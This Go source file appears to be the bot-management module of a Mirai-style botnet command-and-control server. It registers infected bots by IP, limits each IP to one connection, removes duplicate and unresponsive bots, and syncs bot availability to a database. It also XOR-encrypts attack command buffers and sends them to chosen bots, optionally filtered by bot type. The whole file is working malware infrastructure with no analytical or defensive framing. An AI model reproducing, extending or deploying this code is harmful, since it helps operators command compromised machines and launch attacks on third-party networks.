package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

// AttackSend represents an attack command to be sent to bots
type AttackSend struct {
    buf          []byte
    assignedBots []int
    botCata      string
}

type ClientList struct {
    uid                int
    clients            map[int]*Bot
    addQueue           chan *Bot
    delQueue           chan *Bot
    atkQueue           chan AttackSend
    distViewReq        chan int
    distViewRes        chan map[string]int
    cntMutex           *sync.Mutex
    availableBots      map[int]bool
    freeUIDs           []int
    connectedIPs       map[string]int
    seenIPs            map[string]bool
    lastDisconnectTime map[string]time.Time
}

func NewClientList() *ClientList {
    c := &ClientList{
        uid:                0,
        clients:            make(map[int]*Bot),
        addQueue:           make(chan *Bot, 128),
        delQueue:           make(chan *Bot, 128),
        atkQueue:           make(chan AttackSend),
        distViewReq:        make(chan int, 64),
        distViewRes:        make(chan map[string]int, 64),
        cntMutex:           &sync.Mutex{},
        availableBots:      make(map[int]bool),
        freeUIDs:           make([]int, 0),
        connectedIPs:       make(map[string]int),
        seenIPs:            make(map[string]bool),
        lastDisconnectTime: make(map[string]time.Time),
    }
    go c.worker()
    go c.StartHealthCheck()
    go c.startDuplicateCleanup()
    return c
}

func (this *ClientList) startDuplicateCleanup() {
    ticker := time.NewTicker(1 * time.Second)
    for range ticker.C {
        this.removeDuplicateBots()
    }
}

func (this *ClientList) removeDuplicateBots() {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    ipToBots := make(map[string][]*Bot)
    for _, bot := range this.clients {
        ip := bot.conn.RemoteAddr().(*net.TCPAddr).IP.String()
        ipToBots[ip] = append(ipToBots[ip], bot)
    }

    for ip, bots := range ipToBots {
        if len(bots) <= 1 {
            continue
        }

        // Remove all but the first bot
        for _, bot := range bots[1:] {
            fmt.Printf("Removing excess bot UID %d for IP %s\n", bot.uid, ip)
            bot.conn.Close()
            delete(this.clients, bot.uid)
            delete(this.availableBots, bot.uid)
            this.freeUIDs = append(this.freeUIDs, bot.uid)
            database.SyncBotAvailability(bot.uid, false)
        }
        this.connectedIPs[ip] = 1 // Only one bot remains
    }
}

func (this *ClientList) StartHealthCheck() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
        var unresponsive []*Bot
        this.cntMutex.Lock()
        for _, bot := range this.clients {
            if time.Since(bot.lastPing) > 1*time.Minute {
                unresponsive = append(unresponsive, bot)
            }
        }
        this.cntMutex.Unlock()
        for _, bot := range unresponsive {
            bot.conn.Close()
            this.DelClient(bot)
        }
    }
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    return len(this.clients)
}

func (this *ClientList) Distribution() map[string]int {
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
    ip := c.conn.RemoteAddr().(*net.TCPAddr).IP.String()

    this.cntMutex.Lock()

    if this.connectedIPs[ip] >= 1 {
        this.cntMutex.Unlock()
        fmt.Printf("Connection from IP %s rejected: only one connection allowed per IP\n", ip)
        c.conn.Close()
        return
    }

    if lastDisconnect, exists := this.lastDisconnectTime[ip]; exists && time.Since(lastDisconnect) < 10*time.Second {
        this.cntMutex.Unlock()
        fmt.Printf("IP %s attempted reconnect too soon - Connection rejected\n", ip)
        c.conn.Close()
        return
    }

    var assignedUID int
    if len(this.freeUIDs) > 0 {
        assignedUID = this.freeUIDs[0]
        this.freeUIDs = this.freeUIDs[1:]
    } else {
        this.uid++
        assignedUID = this.uid
    }
    c.uid = assignedUID

    this.clients[c.uid] = c
    this.connectedIPs[ip] = 1
    this.availableBots[c.uid] = true
    isFresh := !this.seenIPs[ip]
    this.seenIPs[ip] = true
    this.cntMutex.Unlock()

    if isFresh {
        fmt.Printf("\x1b[1;36m[NEW CLIENT] \x1b[0mBot: \x1b[1;34m%s\x1b[0m | Type: \x1b[1;35m%s\x1b[0m | Available: %v\n",
            c.conn.RemoteAddr(), c.source, this.availableBots[c.uid])
    }

    database.SyncBotAvailability(c.uid, true)
}

func (this *ClientList) DelClient(c *Bot) {
    ip := c.conn.RemoteAddr().(*net.TCPAddr).IP.String()
    this.delQueue <- c
    this.cntMutex.Lock()
    delete(this.connectedIPs, ip)
    this.lastDisconnectTime[ip] = time.Now()
    if c.uid > 0 {
        delete(this.availableBots, c.uid)
        this.freeUIDs = append(this.freeUIDs, c.uid)
        database.SyncBotAvailability(c.uid, false)
    }
    this.cntMutex.Unlock()
}

func (this *ClientList) QueueBuf(buf []byte, assignedBots []int, botCata string) {
    if len(buf) < 2 {
        return
    }
    lengthPrefix := buf[0:2]
    data := buf[2:]
    encryptedData := make([]byte, len(data))
    copy(encryptedData, data)
    xorCrypt(encryptedData)
    sendBuf := make([]byte, 0, len(buf))
    sendBuf = append(sendBuf, lengthPrefix...)
    sendBuf = append(sendBuf, encryptedData...)
    this.atkQueue <- AttackSend{buf: sendBuf, assignedBots: assignedBots, botCata: botCata}
}

func (this *ClientList) worker() {
    for {
        select {
        case del := <-this.delQueue:
            this.cntMutex.Lock()
            if _, exists := this.clients[del.uid]; exists {
                delete(this.clients, del.uid)
            } else {
                fmt.Printf("Bot %d not found in clients\n", del.uid)
            }
            this.cntMutex.Unlock()
        case atk := <-this.atkQueue:
            this.cntMutex.Lock()
            for _, uid := range atk.assignedBots {
                if bot, exists := this.clients[uid]; exists {
                    if atk.botCata == "" || atk.botCata == bot.source {
                        bot.QueueBuf(atk.buf)
                    }
                }
            }
            this.cntMutex.Unlock()
        case <-this.distViewReq:
            res := make(map[string]int)
            this.cntMutex.Lock()
            for _, v := range this.clients {
                res[v.source]++
            }
            this.cntMutex.Unlock()
            this.distViewRes <- res
        }
    }
}
